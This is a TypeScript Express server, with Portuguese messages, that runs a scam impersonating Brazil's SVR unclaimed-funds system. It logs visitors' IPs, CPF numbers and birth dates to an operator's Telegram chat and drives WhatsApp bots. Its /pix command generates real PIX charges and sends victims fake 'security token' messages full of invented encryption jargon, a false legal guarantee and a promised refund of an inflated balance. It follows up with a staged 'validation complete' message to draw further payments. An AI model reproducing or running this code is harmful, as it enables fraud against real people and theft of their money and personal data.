import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import axios from "axios";
import fs from "fs";
import path from "path";
import { spawn, ChildProcess } from "child_process";

dotenv.config();

const app = express();
const port = process.env.PORT || 8080;

// Config state
const configPath = path.join(process.cwd(), "config.json");
let currentConfig = {
  whatsappNumber: process.env.WHATSAPP_NUMBER || "5511971730325",
};

// Sessions state for Telegram tracking
const sessions = new Map<string, {
  messageId: number,
  startTime: number,
  lastHeartbeat: number,
  ip: string,
  device: string,
  location: string,
  converted: boolean,
  docValue: string,
  birthDate: string
}>();

// Bot states for interactive commands
const botStates = new Map<number, { action: string, data?: any }>();

// Multi-Bot Management
const botProcesses = new Map<string, ChildProcess>();
const MAX_SLOTS = 5;

function stopBot(id: string) {
  const proc = botProcesses.get(id);
  if (proc) {
    try { proc.kill(); } catch (e) { }
    botProcesses.delete(id);
  }
}

let isBotStarting = false;
function startBot(id: string = 'main') {
  if (isBotStarting && id === 'main') return;
  if (id === 'main') isBotStarting = true;
  
  stopBot(id);
  console.log(`🤖 [SISTEMA] Iniciando instância do robô: ${id}`);
  const proc = spawn('node', ['whatsapp-bot.cjs', `--id=${id}`], { stdio: 'inherit' });
  botProcesses.set(id, proc);
}

function resetBotSession(id: string) {
  stopBot(id);
  const sessionPath = path.join(process.cwd(), '.wwebjs_auth', `session-${id}`);
  if (fs.existsSync(sessionPath)) {
    try { fs.rmSync(sessionPath, { recursive: true, force: true }); } catch (e) { }
  }
  startBot(id);
}

if (fs.existsSync(configPath)) {
  const saved = JSON.parse(fs.readFileSync(configPath, "utf-8"));
  if (saved.whatsappNumber) currentConfig.whatsappNumber = saved.whatsappNumber;
}

if (!currentConfig.whatsappNumber) {
  currentConfig.whatsappNumber = "5511971730325"; // Número mestre de recuperação
}

const TG_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || "").replace(/"/g, "");
const CHAT_ID = (process.env.TELEGRAM_CHAT_ID || "").replace(/"/g, "");
const TELEGRAM_URL = `https://api.telegram.org/bot${TG_TOKEN}`;

app.use(cors({ origin: "*", methods: ["GET", "POST"] }));
app.use(express.json());
app.use(express.static(path.join(process.cwd(), 'dist')));

// Helper to send/edit Telegram messages
async function sendTelegram(text: string, messageId?: number, replyMarkup?: any) {
  if (!TG_TOKEN || !CHAT_ID) return null;

  try {
    const url = messageId
      ? `${TELEGRAM_URL}/editMessageText`
      : `${TELEGRAM_URL}/sendMessage`;

    const payload: any = {
      chat_id: CHAT_ID,
      text,
      parse_mode: 'HTML'
    };
    if (messageId) payload.message_id = messageId;
    if (replyMarkup) payload.reply_markup = replyMarkup;

    const res = await axios.post(url, payload);
    return res.data.result.message_id;
  } catch (err) {
    return null;
  }
}

// 1. Session Start (Initial Visit)
app.post("/api/v1/session/start", async (req, res) => {
  const { device, location, userId } = req.body;
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "0.0.0.0";

  if (sessions.has(userId)) return res.json({ status: "exists" });

  const startTime = Date.now();
  const message = `<b>👤 NOVO VISITANTE ONLINE</b>\n\n` +
    `<b>IP:</b> ${ip}\n` +
    `<b>Dispositivo:</b> ${device}\n` +
    `<b>Local:</b> ${location || 'Brasil'}\n` +
    `<b>Status:</b> 🟢 Navegando no site...\n` +
    `<b>Início:</b> ${new Date(startTime).toLocaleTimeString()}`;

  const messageId = await sendTelegram(message);
  if (messageId) {
    sessions.set(userId, {
      messageId,
      startTime,
      lastHeartbeat: startTime,
      ip: String(ip),
      device,
      location: location || 'Brasil',
      converted: false,
      docValue: "",
      birthDate: ""
    });
  }
  res.json({ status: "started", userId });
});

// 2. Session Heartbeat
app.post("/api/v1/session/heartbeat", (req, res) => {
  const { userId } = req.body;
  const session = sessions.get(userId);
  if (session) {
    session.lastHeartbeat = Date.now();
    console.log(`💓 Heartbeat: Lead #${userId} continua ativo.`);
    res.json({ status: "alive" });
  } else {
    res.json({ status: "not_found" });
  }
});

// 3. Conversion (Went to WhatsApp)
app.post("/api/v1/session/convert", async (req, res) => {
  const { userId, details } = req.body;
  const session = sessions.get(userId);
  if (session && !session.converted) {
    session.converted = true;
    session.docValue = details.docValue;
    session.birthDate = details.birthDate;
    const timeSpent = Math.floor((Date.now() - session.startTime) / 1000);
    const message = `<b>🔥 CLIENTE FOI PARA O WHATSAPP</b>\n\n` +
      `<b>IP:</b> ${session.ip}\n` +
      `<b>Documento:</b> ${details.docValue}\n` +
      `<b>Tempo no site:</b> ${Math.floor(timeSpent / 60)}m ${timeSpent % 60}s\n` +
      `<b>Status:</b> ✅ REDIRECIONADO`;

    await sendTelegram(message, session.messageId);
    res.json({ status: "converted" });
  } else {
    res.json({ status: "ignored" });
  }
});

// 4. Metrics Log (General)
app.post("/api/v1/metrics/log", async (req, res) => {
  const { payload } = req.body;
  if (!payload) return res.sendStatus(200);
  const decoded = JSON.parse(Buffer.from(payload, 'base64').toString());
  await sendTelegram(decoded.message);
  res.json({ status: "ok" });
});

app.get("/api/v1/session/data/:userId", (req, res) => {
  const session = sessions.get(req.params.userId);
  if (session) {
    res.json({ docValue: session.docValue, birthDate: session.birthDate });
  } else {
    res.status(404).json({ error: "not_found" });
  }
});

app.get("/api/config", (req, res) => {
  console.log(`[API] Consulta de config recebida. Enviando nmero: ${currentConfig.whatsappNumber}`);
  res.json(currentConfig);
});

// Cleanup task
setInterval(async () => {
  const now = Date.now();
  for (const [userId, session] of sessions.entries()) {
    if (!session.converted && now - session.lastHeartbeat > 45000) {
      const timeSpent = Math.floor((now - session.startTime) / 1000);
      const message = `<b>👤 VISITANTE SAIU (Sem conversão)</b>\n\n` +
        `<b>IP:</b> ${session.ip}\n` +
        `<b>Tempo:</b> ${Math.floor(timeSpent / 60)}m ${timeSpent % 60}s\n` +
        `<b>Status:</b> 🔴 Offline`;
      await sendTelegram(message, session.messageId);
      sessions.delete(userId);
    }
  }
}, 15000);

// --- Telegram Bot Interactive Polling ---
async function startTelegramPolling() {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  if (!token) return;

  let lastUpdateId = 0;
  console.log("🤖 Telegram Bot Polling started...");

  while (true) {
    try {
      const response = await axios.get(`${TELEGRAM_URL}/getUpdates`, {
        params: { offset: lastUpdateId + 1, timeout: 30 }
      });

      for (const update of response.data.result) {
        lastUpdateId = update.update_id;
        const cb = update.callback_query;
        const msg = update.message || cb?.message;
        const userId = msg?.from?.id || cb?.from?.id;
        if (!userId) continue;

        const state = botStates.get(userId);
        let text = msg?.text || "";

        // Se for um botão, tratamos o callback_data como o texto do comando
        if (cb) {
          text = cb.data;
          // Respondemos ao Telegram que recebemos o clique (evita o ícone de carregando no botão)
          await axios.post(`${TELEGRAM_URL}/answerCallbackQuery`, { callback_query_id: cb.id });
        }

        const command = text.split("@")[0].trim();

        // Command: /setzap
        if (command.startsWith("/setzap")) {
          const parts = text.split(" ");
          if (parts.length < 2) {
            await sendTelegram("❌ <b>ERRO DE FORMATO</b>\n\nVocê precisa enviar o número junto com o comando.\n\nExemplo: <code>/setzap 5511999999999</code>");
          } else {
            const newNum = parts[1].replace(/\D/g, "");
            if (newNum.length < 10 || newNum.length > 15) {
              await sendTelegram("❌ <b>NÚMERO INVÁLIDO</b>\n\nO número parece estar incorreto. Certifique-se de incluir o DDI (55) e o DDD.\n\nExemplo correto: <code>5511999999999</code>");
            } else {
              botStates.set(userId, { action: "confirm_zap", data: newNum });
              await sendTelegram(`⚠️ <b>CONFIRMAÇÃO DE SEGURANÇA</b>\n\nVocê está prestes a alterar o número de atendimento para:\n<code>${newNum}</code>\n\nConfirma esta ação?\nResponda <b>SIM</b> para aplicar ou <b>NÃO</b> para cancelar.`);
            }
          }
          continue;
        }

        // Handle states
        if (state?.action === "confirm_zap") {
          if (text.toUpperCase() === "SIM") {
            currentConfig.whatsappNumber = state.data;
            fs.writeFileSync(configPath, JSON.stringify(currentConfig));
            await sendTelegram(`✅ <b>SUCESSO!</b>\nNúmero atualizado para: <code>${state.data}</code>\n\n💡 <i>Dica: Envie o comando /resetbot para desconectar o WhatsApp antigo e gerar um novo QR Code para este novo número.</i>`);
            botStates.delete(userId);
          } else {
            await sendTelegram("❌ Alteração cancelada.");
            botStates.delete(userId);
          }
          continue;
        }

        if (command === "/status") {
          const onlineCount = Array.from(sessions.values()).filter(s => !s.converted).length;

          let slotsInfo = "";
          for (let i = 1; i <= MAX_SLOTS; i++) {
            const id = i === 1 ? 'main' : `parceiro${i}`;
            let status = "⚪ Offline";
            try {
              const statusPath = path.join(process.cwd(), `bot-status-${id}.json`);
              if (fs.existsSync(statusPath)) {
                const data = JSON.parse(fs.readFileSync(statusPath, 'utf-8'));
                if (data.status === 'CONNECTED') status = `🟢 Online (${data.adminName})`;
                else if (data.status === 'WAITING_QR') status = "🟡 Aguardando QR";
              }
            } catch (e) { }
            slotsInfo += `🔹 <b>Slot ${i}:</b> ${status}\n`;
          }

          await sendTelegram(`📊 <b>STATUS DO PORTAL</b>\n\n` +
            `📱 <b>WhatsApp Principal:</b> <code>${currentConfig.whatsappNumber}</code>\n\n` +
            `🤖 <b>Gerenciamento de Atendentes:</b>\n${slotsInfo}\n` +
            `👥 <b>Usuários Online:</b> ${onlineCount}\n` +
            `🚀 <i>Use /parceiros para gerenciar os slots.</i>`);
          continue;
        }

        if (command === "/parceiros") {
          const msgParceiros = `👥 <b>GESTÃO DE PARCEIROS (AMIGOS)</b>\n\n` +
            `Aqui você pode conectar novos aparelhos para ajudar no atendimento.\n\n` +
            `<b>Limites:</b> Você possui <b>${MAX_SLOTS} slots</b> disponíveis.\n` +
            `<i>Aviso: Cada slot ativo consome RAM. Recomendamos usar no máximo 3 simultâneos.</i>\n\n` +
            `<b>Comandos:</b>\n` +
            `🔗 <code>/conectar [1-5]</code> - Gera QR Code para o slot.\n` +
            `❌ <code>/remover [1-5]</code> - Desconecta e apaga o slot.\n` +
            `🔄 <code>/resetbot</code> - Reinicia apenas o Slot 1.`;
          await sendTelegram(msgParceiros);
          continue;
        }

        if (command.startsWith("/conectar")) {
          const slot = text.split(" ")[1];
          const slotNum = parseInt(slot);
          if (isNaN(slotNum) || slotNum < 1 || slotNum > MAX_SLOTS) {
            await sendTelegram(`❌ Escolha um slot de 1 a ${MAX_SLOTS}.\nExemplo: <code>/conectar 2</code>`);
          } else {
            const id = slotNum === 1 ? 'main' : `parceiro${slotNum}`;
            await sendTelegram(`⏳ <b>Slot ${slotNum}:</b> Iniciando conexão...`);
            resetBotSession(id);
          }
          continue;
        }

        if (command.startsWith("/remover")) {
          const slot = text.split(" ")[1];
          const slotNum = parseInt(slot);
          if (isNaN(slotNum) || slotNum < 1 || slotNum > MAX_SLOTS) {
            await sendTelegram(`❌ Escolha um slot de 1 a ${MAX_SLOTS}.`);
          } else {
            const id = slotNum === 1 ? 'main' : `parceiro${slotNum}`;
            stopBot(id);
            const sessionPath = path.join(process.cwd(), '.wwebjs_auth', `session-${id}`);
            if (fs.existsSync(sessionPath)) fs.rmSync(sessionPath, { recursive: true, force: true });
            const statusFile = path.join(process.cwd(), `bot-status-${id}.json`);
            if (fs.existsSync(statusFile)) fs.unlinkSync(statusFile);
            await sendTelegram(`✅ <b>Slot ${slotNum}:</b> Desconectado e removido.`);
          }
          continue;
        }

        if (command === "/resetbot") {
          await sendTelegram("🔄 <b>Reiniciando Slot 1 (Principal)...</b>");
          resetBotSession('main');
          continue;
        }

        if (command === "/qrcode") {
          await sendTelegram("🖼️ <b>Gerando QR Code do Slot 1...</b>");
          startBot('main');
          continue;
        }

        if (command.startsWith("/pix")) {
          const parts = text.split(" ");
          const valorInput = parts[1];
          let telefone = parts[2];

          if (!valorInput) {
            await sendTelegram("❌ <b>ERRO</b>\nUse: <code>/pix [valor] [telefone_opcional]</code>\nEx: <code>/pix 97.50</code>");
            continue;
          }

          const valorNumeric = parseFloat(valorInput.replace(',', '.'));
          if (isNaN(valorNumeric)) {
            await sendTelegram("❌ <b>ERRO</b>\nValor inválido. Use números, ex: <code>97.50</code>");
            continue;
          }

          // Se não enviou telefone, tenta pegar o último lead ativo
          if (!telefone) {
            try {
              if (fs.existsSync('last-lead.json')) {
                const lastLeadData = JSON.parse(fs.readFileSync('last-lead.json', 'utf-8'));
                if (Date.now() - lastLeadData.timestamp < 1000 * 60 * 60) { // 1 hora de validade
                  telefone = lastLeadData.chatId;
                }
              }
            } catch (e) { }
          }

          if (!telefone) {
            const lastSessionLead = Array.from(sessions.keys()).pop();
            if (lastSessionLead) telefone = lastSessionLead;
          }

          if (!telefone) {
            await sendTelegram("❌ <b>ERRO</b>\nNenhum lead ativo encontrado no portal. Digite o telefone com DDI.\nEx: <code>/pix 97.50 5511999999999</code>");
            continue;
          }

          const statusMsgId = await sendTelegram(`🔍 <b>INICIANDO PROTOCOLO DE SEGURANÇA...</b>\n\nIdentificando titularidade do lead e gerando chaves de criptografia.`);
          
          setTimeout(async () => {
            await sendTelegram(`🔐 <b>GERANDO TOKEN SVR-AUTH...</b>\n\nCriptografando payload via AES-256-GCM e assinando certificado RSA-4096.`, statusMsgId);
          }, 1500);

          try {
            const key = process.env.SVR_CORE_P_PROVIDER;
            const secret = process.env.SVR_CORE_S_AUTH;
            
            if (!key || key === "sua_chave_aqui") {
              throw new Error("Protocolo SVR não autenticado (Configuração Pendente)");
            }

            // Tenta achar dados do lead na sessão
            let leadData = { name: "Cliente SVR", doc: "000.000.000-00" };
            // Procura por telefone na sessão (as vezes o userId é o telefone)
            const session = sessions.get(telefone) || Array.from(sessions.values()).find(s => s.ip === telefone);
            if (session && session.docValue) {
              leadData.doc = session.docValue;
            }

            const endpoint = process.env.SVR_CORE_GATEWAY || 'https://api.fastsoftbrasil.com/api/user/transactions';
            
            // Chamada API de Processamento
            const auth = Buffer.from(`${key}:${secret}`).toString('base64');
            const pixRes = await axios.post(endpoint, {
              amount: Math.round(valorNumeric * 100), // Centavos
              currency: "BRL",
              paymentMethod: "PIX",
              customer: {
                name: leadData.name,
                document: {
                  number: leadData.doc.replace(/\D/g, ""),
                  type: leadData.doc.length > 14 ? "CNPJ" : "CPF"
                }
              }
            }, {
              headers: {
                'Authorization': `Basic ${auth}`,
                'Content-Type': 'application/json'
              }
            });

            const pixCode = pixRes.data.pix_code || pixRes.data.copyPaste || pixRes.data.qrcode;
            
            if (!pixCode) {
              throw new Error("Código PIX não retornado pela API.");
            }

            const protocolId = Math.random().toString(36).substring(7).toUpperCase();
            const valorTotalEstimado = (valorNumeric * 15.5).toFixed(2); // Simulação de valor alto
            const transactionId = pixRes.data.id || pixRes.data.transactionId;

            const formalMessage = `🔐 *SVR - SISTEMA DE VALIDAÇÃO CRIPTOGRÁFICA* 🔐\n\n` +
              `O protocolo de segurança identificou uma pendência de asseguramento. Para liberar o resgate, processe o **TOKEN DE SEGURANÇA** abaixo via seu aplicativo bancário.\n\n` +
              `🖥️ *ESTADO DO SISTEMA:*\n` +
              `\`\`\`\n` +
              `PROTOCOL_ID: 0x${protocolId}\n` +
              `ENCRYPTION: AES-256-GCM\n` +
              `STATUS: WAITING_HASH_VALIDATION\n` +
              `SIGNATURE: RSA-4096-PSS-V1\n` +
              `\`\`\`\n\n` +
              `📍 *TOKEN DE SEGURANÇA (PIX COPIA E COLA):*\n` +
              `Copie o código criptografado abaixo:\n\n` +
              `\`${pixCode}\`\n\n` +
              `*CHECKSUM:* \`SHA256:${Math.random().toString(16).substring(2, 10).toUpperCase()}\`\n\n` +
              `⚠️ *AVISO TÉCNICO:* Este token contém os parâmetros de autenticação necessários para a validação do seu CPF. Ao processá-lo, o sistema de auditoria do **SVR** liberará o estorno de *R$ ${valorNumeric.toFixed(2)}* + o saldo total de *R$ ${valorTotalEstimado}* de forma imediata.\n\n` +
              `🛡️ _A segurança jurídica deste ato é garantida pela Lei 12.846/13 e monitorada pelo sistema de segurança patrimonial do SVR._`;

            // Enviar para o robô de WhatsApp
            fs.writeFileSync(`cmd-send-${Date.now()}.json`, JSON.stringify({ to: telefone, message: formalMessage }));
            
            const adminMsg = `✅ <b>PROTOCOLO ENVIADO!</b>\n\n` +
              `📱 <b>Lead:</b> <code>${telefone}</code>\n` +
              `💰 <b>Valor:</b> R$ ${valorNumeric.toFixed(2)}\n` +
              `🆔 <b>ID Transação:</b> <code>${transactionId || 'N/A'}</code>\n\n` +
              `⏳ <i>Aguardando confirmação de pagamento...</i>`;

            const keyboard = {
              inline_keyboard: [
                [
                  { text: "🔄 Verificar Pagamento", callback_data: `check_pix:${transactionId}:${telefone}:${valorNumeric}:${valorTotalEstimado}` },
                  { text: "➕ Gerar Novo", callback_data: `/pix ${valorNumeric} ${telefone}` }
                ]
              ]
            };

            await sendTelegram(adminMsg, undefined, keyboard);
          } catch (e: any) {
            console.error("Erro FastSoft:", e.response?.data || e.message);
            const errorMsg = e.response?.data?.message || e.message;
            await sendTelegram(`❌ <b>ERRO NA API FASTSOFT</b>\n\n<code>${errorMsg}</code>`);
          }
          continue;
        }

        // --- HANDLER DE CALLBACKS INTERATIVOS ---
        if (cb && cb.data.startsWith("check_pix:")) {
          const [, transId, phone, valor, total] = cb.data.split(":");
          
          await axios.post(`${TELEGRAM_URL}/answerCallbackQuery`, { 
            callback_query_id: cb.id,
            text: "🔍 Consultando banco de dados..."
          });

          try {
            const key = process.env.SVR_CORE_P_PROVIDER;
            const secret = process.env.SVR_CORE_S_AUTH;
            const auth = Buffer.from(`${key}:${secret}`).toString('base64');
            const endpoint = (process.env.SVR_CORE_GATEWAY || 'https://api.fastsoftbrasil.com/api/user/transactions').replace('/transactions', `/${transId}`);
            
            const res = await axios.get(endpoint, {
              headers: { 'Authorization': `Basic ${auth}` }
            });

            const status = res.data.status || res.data.paymentStatus;

            if (status === "PAID" || status === "confirmed" || status === "SUCESSO") {
              const successMsg = `✅ *PARABÉNS! ETAPA DE VALIDAÇÃO CONCLUÍDA* ✅\n\n` +
                `Prezado(a), informamos com satisfação que a primeira fase do seu processo de resgate junto ao **Sistema de Valores a Receber (SVR)** foi finalizada com êxito. Sua **Assinatura Digital de Asseguramento** foi devidamente reconhecida.\n\n` +
                `📍 *STATUS DO PROCESSO:* \n` +
                `● Etapa 1 (Validação): *CONCLUÍDA*\n` +
                `● Etapa 2 (Liberação de Ativos): *PENDENTE*\n` +
                `● Etapa 3 (Assinatura de Termo): *PENDENTE*\n\n` +
                `🛡️ *GARANTIA E SEGURANÇA:* \n` +
                `Fique tranquilo(a). Todo o procedimento é amparado por protocolos de segurança bancária. O valor de *R$ ${parseFloat(valor).toFixed(2)}* utilizado nesta validação está assegurado e será **INTEGRALMENTE REEMBOLSADO** junto ao seu saldo total de resgate (estimado em *R$ ${parseFloat(total).toFixed(2)}*) imediatamente após a conclusão das etapas finais.\n\n` +
                `🚀 *PRÓXIMOS PASSOS:* \n` +
                `Por favor, permaneça neste chat. Nosso sistema está preparando os documentos finais para sua assinatura digital. Em instantes, um especialista em auditoria dará continuidade ao seu atendimento para finalizar a transferência via PIX.\n\n` +
                `Agradecemos pela confiança.\n` +
                `*Equipe de Auditoria SVR*`;

              fs.writeFileSync(`cmd-send-${Date.now()}.json`, JSON.stringify({ to: phone, message: successMsg }));
              
              await sendTelegram(`💰 <b>PAGAMENTO CONFIRMADO!</b>\n\n📱 <b>Lead:</b> ${phone}\n✅ O protocolo de sucesso foi enviado ao lead.`);
              // Opcional: deletar a mensagem original dos botões ou editar
            } else {
              await sendTelegram(`⏳ <b>STATUS: PENDENTE</b>\n\nO lead <code>${phone}</code> ainda não realizou o pagamento.\n\n<i>ID: ${transId}</i>`);
            }
          } catch (e: any) {
            await sendTelegram(`❌ <b>ERRO NA CONSULTA</b>\nO ID <code>${transId}</code> pode ser inválido ou a API está offline.`);
          }
          continue;
        }

        if (command === "/painel" || command === "/start" || command === "/help") {
          const welcomeMsg = `🚀 <b>PAINEL SVR - MULTI-ATENDENTE</b>\n\n` +
            `Gerencie seu portal e seus parceiros aqui.\n\n` +
            `📊 <b>/status</b> - Ver todos os slots\n` +
            `💰 <b>/pix [valor]</b> - Enviar PIX de Segurança\n` +
            `📱 <b>/setzap [número]</b> - Mudar WhatsApp de destino\n` +
            `🖼️ <b>/qrcode</b> - Conectar Slot 1`;

          const keyboard = {
            inline_keyboard: [
              [{ text: "📊 Ver Status", callback_data: "/status" }, { text: "💰 Enviar PIX", callback_data: "/pix 97.50" }],
              [{ text: "🖼️ QR Code Principal", callback_data: "/qrcode" }, { text: "🔄 Reset Principal", callback_data: "/resetbot" }]
            ]
          };

          await sendTelegram(welcomeMsg, undefined, keyboard);
          continue;
        }
      }

    } catch (err) {
      await new Promise(r => setTimeout(r, 5000));
    }
  }
}

app.get('*', (req, res) => {
  const distPath = path.join(process.cwd(), 'dist', 'index.html');
  if (fs.existsSync(distPath)) {
    res.sendFile(distPath);
  } else {
    res.status(404).send('Frontend não compilado. Rode npm run build.');
  }
});

app.listen(port, () => {
  console.log(`Server running on http://localhost:${port}`);
  startTelegramPolling();
  startBot(); // Auto-start the WhatsApp bot
});
